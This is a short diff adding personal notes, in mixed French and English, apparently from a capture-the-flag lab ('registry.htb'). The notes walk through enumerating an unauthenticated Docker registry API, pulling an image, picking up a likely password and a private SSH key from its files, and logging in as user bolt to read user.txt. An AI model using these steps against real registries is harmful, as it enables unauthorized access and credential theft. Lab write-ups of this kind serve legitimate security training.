@@ -1,0 +1,28 @@
+docker manifest a good tuto to understant whats going on :
+	https://docs.docker.com/registry/deploying/
+	https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
+
+Steps: 
+	trouver la page 
+	https://docker.registry.htb/v2
+	https://docker.registry.htb/v2/_catalog (display les instances de la V2)
+on y trouve : 
+	bolt-image
+
+https://docker.registry.htb/v2/bolt-image/tags/list#
+holly graal :
+	https://docker.registry.htb/v2/bolt-image/manifests/latest
+
+Dans les fichiers on peut trouver  GkOcz221Ftb3ugog surement un password
+
+(demande un password que je n'ai pas trouve pour acceder)
+docker login docker.registry.htb/bolt-image
+docker pull docker.registry.htb/bolt-image
+docker run -t -i docker.registry.htb/bolt-image /bin/sh
+
+finally suffisait de se ssh grace a la id_rsa trouvee dans les fichiers 
+	ssh -i id_rsa bolt@docker.registry.htb
+	en utilisant le password precedement trouve 
+on trouve a la racine le flag user.txt
+
+
